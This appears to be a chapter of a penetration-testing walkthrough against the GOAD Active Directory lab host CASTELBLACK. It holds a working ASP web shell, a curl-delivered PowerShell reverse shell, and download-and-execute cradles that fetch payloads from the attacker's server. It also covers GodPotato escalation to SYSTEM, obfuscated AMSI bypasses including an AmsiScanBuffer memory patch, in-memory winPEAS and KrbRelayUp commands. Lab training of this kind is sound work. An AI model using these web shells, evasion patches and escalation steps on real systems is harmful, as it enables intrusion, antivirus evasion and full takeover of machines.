Port `80` of `CASTELBLACK` (`SRV02`) there is a simple `asp.net` application running which allows you to upload files. The following basic `asp.net` web-shell may be uploaded for web-based OS-access:
```asp
<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
            <FORM action="" method="POST">
                <input type="text" name="param" size=45 value="<%= myValue %>">
                <input type="submit" value="Run">
            </FORM>
            <p>
        Result :
        <% 
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
        <br>
    </BODY>
</HTML>
```
It is then accessible via `http://10.3.10.22/upload/webshell.asp`.

To get a reverse shell from this scenario, it is possible to use the same technique as in part [7](./7%20-%20Exploiting%20MSSQL.md) of this journey. First, a `powershell` command is required which acts as a reverse-shell initiator. The previous python script can be used again for this. Afterwards, the listener can be started using `nc`:
```bash
python3 payload.py <local_ip> <port>
```
```bash
nc -lvnp <port>
```

And lastly, the resulting `powershell` command can then be hard-coded within the `asp.net` web-shell (in `request("<command>")`), or it can be sent over using the intended functionality of the web-shell:
```bash
curl -X POST -d "param=powershell+-exec+bypass+-enc+<base64_cmd>" http://10.3.10.22/upload/webshell.asp
```

When executing `whoami /all` command in the reverse shell, the output is pretty interesting:
```bash
Privilege Name                Description
============================= =========================================
SeImpersonatePrivilege        Impersonate a client after authentication
```
This privilege means that the current user is allowed to impersonate (act as) a security token which belongs to another user. If you manage to get a process to connect to you which has high privileges, you essentially can execute commands as that privileged process. There are a few tools which automate the exploitation of forcing a high-privileged process to connect to you (e.g. endpoint you control), capturing its token and impersonating it.

## SeImpersonatePrivilege to Authority\system
A [blog post](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) explains different windows exploits (so called potatoes) leading to privilege escalation to the account `Authority/System` by abusing the `SeImpersonatePrivilege`. I have chosen the tool [GodPotato](https://github.com/BeichenDream/GodPotato) tool for this job.

I visit the `github` and look at the releases. There, i can find 3 `.exe` files, `GodPotato-NET2.exe`, `GodPotato-NET35.exe`, and `GodPotato-NET4.exe`. These different numbers stand for the `.NET` version running on the target. I quickly find out which version is running on the target machine using this command in the reverse shell:
```powershell
[System.Environment]::Version
```
The output tells me that i need the `GodPotato-NET4.exe`:
```powershell
Major  Minor  Build  Revision
-----  -----  -----  --------
4      0      30319  42000 
```

So, i simply `wget` the `GodPotato-NET4.exe` onto my local machine, and start a web server which offers it for download:
```bash
python3 -m http.server <port>
```
On the target, i can download the executable into the `C:\backups` directory like this:
```bash
wget -O test.exe http://<local-IP>:<port>/test.exe
```
And it worked! I can now use the executable to issue any `powershell` command which gets executed as the user `nt authority\system` (has higher privileges as `Administrator`):
```powershell
./test.exe -cmd "whoami"
```

## AMSI bypass
To test `AMSI` bypasses, the Windows defender must be active. This can be achieved by using the `remote-desktop` protocol on the server which hosts the web-service (`CASTELBLACK`), and by manually enabling it in Windows settings:
```bash
xfreerdp3 /u:vagrant /p:vagrant /v:castelblack /cert:ignore
```

Within the `remote desktop` session, it is possible to verify that `AMSI` is active by loading a script into memory which is flagged as malicious (not saving it onto disk):
```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-WireTap.ps1')
```
```bash
# output:
```
```powershell
iex : At line:1 char:1
+ function Invoke-WireTap
+ -----------------------
This script contains malicious content and has been blocked by your antivirus software.
```

Many `AMSI` bypass-techniques can be found on [this GitHub](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass). There is also a [website](https://amsi.fail/) which can generate a obfuscated `AMSI` bypass one-liner. Public `AMSI` bypasses may be signed, which makes them easily recognizable by Windows Defender. To bypass signature checks, minor modifications can be made to the bypass scripts, which makes them unrecognizable again.
Original `AMSI` bypass:
```powershell
Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
```
Modified `AMSI` bypass:
```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');
```
```powershell
$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');
```
```powershell
$z=$y.GetValue($null);
```
```powershell
[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```

Bypassing windows `AMSI` may not be enough in some scenarios, as `.NET` `AMSI` will still kick in. Public `AMSI`-Bypasses only work for `PowerShell` scripts. To bypass `.NET AMSI`, the `amsi.dll` must be somehow circumvented.

To bypass `Windows AMSI` and `.NET` level `AMSI`, the following script can be loaded onto a attacker-controlled disk as `dotnet_bypass.txt`. It can be made available via an `python` web-server (`python3 -m http.server <port>`):
```powershell
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

The following command can then be used via the `ps` reverse shell to download it, and execute it in memory:
```bash
(new-object system.net.webclient).downloadstring('http://<ip>:<port>/dotnet_bypass.txt')|IEX
```

Below is step-by-step summary on how to bypass `PowerShell AMSI` and `.NET AMSI` at the same time:

#### 1. Step
Disable `PowerShell AMSI` with the following commands
```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');
```
```powershell
$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');
```
```powershell
$z=$y.GetValue($null);
```
```powershell
[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```

#### 2. Step
 Disable `.NET AMSI` with the following command after serving this file on a `http.server`. (Executing this without the prior steps gives you a `This script contains malicious content...` error message!)
```bash
(new-object system.net.webclient).downloadstring('http://<ip>:<port>/dotnet_bypass.txt')|IEX
```
This should return a simple `True` reply in the shell, indicating that `AMSI` for `PowerShell` and `.NET` has been bypassed!

The last thing to look out for is that the hard-disk **should not** be touched with any files, or the bypass may break.


Another way of executing this `AMSI` bypass is by serving each step of the `PowerShell AMSI` bypass and the `.NET AMSI` bypass in different text files. The following command invokes each of these text files in order to bypass `AMSI`:
```bash
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<your-host>/pwsh1.txt'); iex(New-Object Net.WebClient).DownloadString('http://<your-host>/pwsh2.txt'); iex(New-Object Net.WebClient).DownloadString('http://<your-host>/pwsh3.txt'); iex(New-Object Net.WebClient).DownloadString('http://<your-host>/pwsh4.txt'); iex(New-Object Net.WebClient).DownloadString('http://<your-host>/dotnet_bypass.txt')"
```

## winPEAS in memory
The (`windows-`) `privilege escalation awesome script` automatically scans a broad range of privilege escalation vectors. As it is so well known, it is obviously flagged by `AMSI`, which is why an `AMSI-bypass` for the current `PowerShell` is required using the steps before.

To get `winPEAS` on `CASTELBLACK`, it can be first downloaded from the `GitHub`, and then served via a `python http.server`:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
```
```bash
python3 -m http.server <port>
```

This command downloads the `winPEASany_ofs.exe` onto the `reverse shell session` which is currently being served by the `http.server`:
```powershell
$data=(New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port>/winPEASany_ofs.exe');
```
The following steps are required to show the tool's output on the `stdout` of the reverse shell:
```powershell
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
```
```powershell
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
```
```powershell
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```
Finally, the following command executes `winPEAS` in memory, and shows its output in the window:
```powershell
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```

The problem arises, that the first part of the output gets cut off because its too verbose. To mitigate that, we may just save the output into a file which we can read:
```powershell
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString() | Out-File -FilePath "C:\Users\Public\Documents\output.txt"
```

The tool `PowerSharpPack.ps1` from [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t) is an alternative way of using `winPEAS`. In the same directory which is serving the previous file, this tool can also be cloned:
```bash
git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git
```
The executable can then be fetched from our server, loaded into memory, and finally executed:
```powershell
iex(new-object net.webclient).downloadstring('http://<local_ip>:<port>/PowerSharpPack/PowerSharpPack.ps1')
```
```powershell
PowerSharpPack -winPEAS
```
```powershell
PowerSharpPack -winPEAS | Out-File -FilePath "C:\Users\Public\Documents\output2.txt"
```

### KrbRelayUp
... is a tool found on [this GitHub](https://github.com/Dec0ne/KrbRelayUp) which is deemed a no-fix privilege escalation vector, as it abuses active directory functionality which cannot be removed. It abuses `Resource-Based Constrained Delegation` (`RBDC`) or `Shadow Credentials`, and then it expands the privileges of a new account, without possessing administrative privileges. There are two pre-requisites to this attack:

1. `LDAP` signing must not be enforced (which it isn't by default). A `netexec` scan can search for this enforcement:

```bash
nxc ldap 10.3.10.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M ldap-signing
```

2. A user account is needed which is allowed to add a new computer. The following `netexec` scan shows you the `Machine Account Quota` (`MAQ`) for a given account:

```bash
nxc ldap 10.3.10.11 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```

It can be used using the following commands if the conditions above are met (creates and activates the `powershell` of a new account, which acts as `SYSTEM`):
```powershell
./KrbRelayUp.exe relay -Domain north.sevenkingdoms.local -CreateNewComputerAccount -ComputerName evilhost2$ -ComputerPassword pass@123
```
```powershell
./KrbRelayUp.exe spawn -m rbcd -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local -cn evilhost2$ -cp pass@123
```

If `Windows Defender` or `AMSI` block this binary from executing, it can either be bypassed, or it can be used like described in [this blogpost](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9).